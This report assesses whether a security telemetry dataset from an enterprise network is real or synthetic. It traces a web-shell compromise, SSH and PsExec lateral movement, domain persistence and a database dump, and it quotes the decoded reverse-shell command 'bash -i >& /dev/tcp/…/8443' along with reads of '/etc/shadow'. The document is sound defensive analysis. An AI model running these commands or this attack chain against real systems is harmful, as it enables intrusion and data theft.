# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Real
**Verdict Confidence:** 76
**Synthetic-Confidence Score:** 29

## Executive Summary

This six-hour slice looks more like selectively collected production telemetry than a generated exercise: the environment is noisy, host roles are legible, and the suspicious activity can be pivoted across web, host, authentication, network, proxy, firewall, and file evidence without a material causal break. A few concrete artifacts keep it out of the indistinguishable range, especially one process-termination ordering anomaly and a PsExec authentication/transport source-port gap, but they are isolated and could plausibly result from source-local delay or collection loss.

## Evidence For Synthetic

- `[contract_gap]` In `WS-AJOHNSON-01.meridianhcs.local/ecar.json`, Teams utility process PID 6212 terminates at `2024-03-18T16:10:37.492Z`, yet seven `MODULE LOAD` records for the same PID follow between `.497Z` and `.575Z`. A process cannot load DLLs after exit in event time, although an 83 ms inversion is small enough to be explained by independently delayed endpoint records.
- `[contract_gap]` The PsExec-like pivot into DC-01 has a weak tuple join. `windows_event_security.xml` records the `aisha.johnson` Type 3 logon at `2024-03-18T16:00:21.8273019Z` from `10.10.1.35:51829`, while the visible SMB transport used for the target-side `PSEXESVC.exe` drop is `10.10.1.35:61990 -> 10.10.2.10:445` in Zeek and eCAR; DCE/RPC follows on source port 61991. A separate authentication connection could have been unobserved, so this is a correlation gap rather than a hard contradiction.
- `[environment_or_collection_plausibility]` Several recurring application workflows use domain controllers as general storage endpoints: APP-INT-01 polls an `Integration` share on DC-01/DC-02, MAIL-EDGE-01 targets a `MailArchive` share on DC-02, and DB-PROD-01 uses `smb://DC-02.meridianhcs.local/DatabaseBackups`. This is operationally possible but an unusual concentration of non-directory file-service duties on domain controllers.
- `[distribution_texture]` Linux interactive histories repeatedly draw from a narrow administrative vocabulary across unrelated systems and users—`systemctl is-active`, `journalctl -u ...`, `ss`, `last`, `df`, and short log-tail commands recur on APP-INT-01, DB-PROD-01, LOG-MON-01, MAIL-CLIN-01, MAIL-EDGE-01, PROXY-01, and WEB-EXT-01. The parameters and timing vary enough that this is only a modest tell, not a dataset-wide mechanical cadence.

## Evidence For Real

- The internet-facing compromise is operationally coherent. `WEB-EXT-01.meridianhcs.local/web_access.log` shows `185.70.41.45` posting to `/ehr/admin/upload.php` at `13:19:41Z`; eCAR then shows Apache/www-data spawning a base64-decoding shell at `13:19:42.527Z`, followed by `10.10.3.10:45829 -> 45.33.32.30:8443` at `13:19:46.689Z`. Zeek records the same callback as a 25.866842-second `SF` connection with bidirectional bytes, and the perimeter ASA records its outbound/NAT path.
- The later internal pivot is similarly usable for hunting. Zeek observes SSH from WEB-EXT-01 (`10.10.3.10:38340`) to APP-INT-01 (`10.10.2.30:22`) at `14:15:18Z`; APP syslog records connection, accepted password, PAM open, and systemd-logind session 377216 between `14:15:21Z` and `14:15:30Z`. eCAR attaches subsequent `cat /etc/passwd`, `cat /etc/shadow`, the later SSH client, and cleanup activity to that same root session.
- Windows lateral movement has strong target-side mechanics. At about `16:00:21Z`, the source and destination eCAR views show SMB and DCE/RPC traffic from WS-AJOHNSON-01 to DC-01; DC-01 then records `C:\Windows\PSEXESVC.exe` creation, service `PSEXESVC`, execution under SYSTEM, and a SYSTEM child `cmd.exe /c whoami && hostname`. The ordering is transport, file drop/service creation, process start, then command execution.
- The domain persistence sequence is technically plausible and richly supported: DC-01 records creation of `svc_dirsync`, addition to Domain Admins, creation of `DeviceSyncSvc`, and an hourly scheduled task. Security events, Sysmon process records, and eCAR process/service/file records provide viable pivots rather than isolated storyline rows.
- The DB collection path is internally consistent. APP-INT-01 launches SSH as root at `17:14:34.614Z`; Zeek sees `10.10.2.30:35624 -> 10.10.4.10:22` at `17:14:47Z`; DB-PROD-01 syslog records connection, accepted password, PAM open, and session 279031; and eCAR places `mysqldump`, staging under `/tmp`, gzip, and SCP in the same shell/session. The resulting SCP transport at `17:30:28Z` is mirrored at APP-INT-01 with an inbound SSH session and creation of `/tmp/.cache/rpt_0318.sql.gz`.
- Noise is substantial and role-aware. The slice contains 21 named hosts across workstation, domain-controller, file, application, database, mail, proxy, monitoring, and DMZ roles; thousands of Zeek connections; large Security/Event and eCAR streams; proxy and ASA traffic; internet scans; routine LDAP/Kerberos/DNS/SMB; user browsing; patching; cron; systemd; mail; DHCP; and failed connections. Suspicious records are needles inside materially larger source families.
- Temporal texture is not globally uniform. User sessions, browser and application bursts, failed connections, scan traffic, scheduled infrastructure work, and long-lived SSH/RDP sessions coexist, while short network logons terminate quickly. Periodic records such as CRON/sysstat remain appropriately periodic rather than forcing all activity onto a fixed cadence.

## Detailed Analysis

**Environment and collection profile.** The visible scope is a compact enterprise with user workstations on `10.10.1.0/24`, core servers on `10.10.2.0/24`, a DMZ on `10.10.3.0/24`, and a database segment on `10.10.4.0/24`. Available sources include Windows Security and Sysmon XML, Linux syslog and timestamped bash histories, eCAR endpoint telemetry, three Zeek vantage points, proxy access, web access, ASA firewall, and two Snort streams. Volumes fit a filtered six-hour collection: the two DCs dominate authentication and WFP records, the proxy and public web server dominate relevant traffic, and workstations carry smaller endpoint streams.

**Initial access and command execution.** The strongest suspicious cluster begins with the public POST at `13:19:41Z`. The Apache-to-shell parentage, the encoded payload (`bash -i >& /dev/tcp/45.33.32.30/8443 0>&1` after base64 decoding), and the callback tuple agree. The callback starts after process creation and closes after roughly 26 seconds. Concurrent benign web requests, failed database calls, internet scans, and proxy traffic make this cluster discoverable without making it the only activity in the source family.

**Internal movement and privilege use.** The SSH transition from WEB-EXT-01 to APP-INT-01 preserves source/destination addresses, source port 38340, target port 22, user root, and session identifiers across Zeek, syslog, and eCAR. The root shell lives for hours, which makes the later APP-to-DB pivot feasible without inventing a new access path. The PsExec path into DC-01 also contains the expected SMB transport, service executable drop, service creation, SYSTEM service process, and child command. The unmatched 4624 source port weakens exact tuple pivoting but does not make the visible sequence impossible under the stated collection model.

**Persistence, collection, and transfer.** On DC-01, the `net user`, Domain Admins group modification, service creation, and scheduled-task evidence is source-native enough to support independent detections. The DB activity is especially convincing: the remote SSH login precedes root shell creation; database discovery precedes `mysqldump`; the dump exists before gzip; gzip exists before SCP; and the receiver records the corresponding inbound SSH/file creation. Process and transfer durations are not collapsed to identical timestamps.

**Baseline and hunt difficulty.** The background is broad enough to create realistic pivots and false-positive pressure: administrators legitimately use SSH/RDP, users and services access SMB shares, endpoint agents open processes, domain controllers exchange Kerberos/LDAP, the public host sees indiscriminate probes, and proxy traffic includes successes, authentication challenges, and failures. Some administrative command vocabulary is repetitive, and the DCs appear to carry more general-purpose SMB duties than ideal, but neither pattern overwhelms the six-hour slice.

**Bounded-window and delay handling.** I did not count sessions already open at 12:00Z, processes without visible births, or lifecycles extending beyond 18:00Z as defects. I also did not treat high cross-source coverage as suspicious. The one same-PID terminate-before-module-load inversion is retained because both sides are visible within the window, but its sub-100 ms size substantially limits its weight given legitimate source-local delay.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Effect on score |
|---|---|---|---|
| `contract_gap` | eCAR endpoint lifecycle | One PID on WS-AJOHNSON-01 | Seven module loads follow PID 6212 termination by 5-83 ms; concrete but plausibly delay-induced. |
| `contract_gap` | Windows Security / eCAR / Zeek SMB | One PsExec pivot | Type 3 authentication source port 51829 does not join the visible SMB 61990 or RPC 61991 transport. |
| `environment_or_collection_plausibility` | SMB/application infrastructure | Repeated across several server workflows | DC-01/DC-02 serve as application integration, mail archive, or DB backup endpoints in addition to normal SYSVOL/NETLOGON duties. |
| `distribution_texture` | Linux shell/process telemetry | Repeated, low intensity | Multiple users and hosts reuse a relatively compact systemctl/journalctl/ss/log-tail command vocabulary. |

## Realism Score by Category

- **Field format accuracy:** 9 — The reviewed web, syslog, eCAR, Zeek, proxy, firewall, and Windows values are consistently usable, with no impossible high-impact field value found.
- **Temporal patterns:** 8 — Most causal chains and lifecycles order correctly; one sub-100 ms eCAR process/module inversion prevents a higher score.
- **Cross-source correlation:** 9 — Major web, SSH, RDP, SMB, DB, and file-transfer pivots align well; the PsExec authentication source port is the main gap.
- **Behavioral realism:** 8 — Tradecraft and benign activity are technically plausible, though Linux administrator commands have a somewhat reusable texture.
- **Environmental consistency:** 8 — Segmentation and source volumes fit the host roles, with some questionable general-purpose SMB duties assigned to the DCs.

## Recommendations

- If this were synthetic, preserve per-process lifecycle order after applying source-local delay so module/file/network dependents cannot receive event timestamps later than the same PID's termination.
- If this were synthetic, make the PsExec authentication contract explicit: either retain the separate SMB authentication connection carrying source port 51829 or bind the 4624 record to the visible SMB tuple on 61990.
- If this were synthetic, keep application integration, mail archive, and database backup repositories on role-appropriate file/storage hosts unless the DC placement is intentional and supported by visible share/service configuration.
- If this were synthetic, broaden Linux administrators' long-tail command behavior and host-specific tooling while retaining the good user, parameter, and timing variation already present.
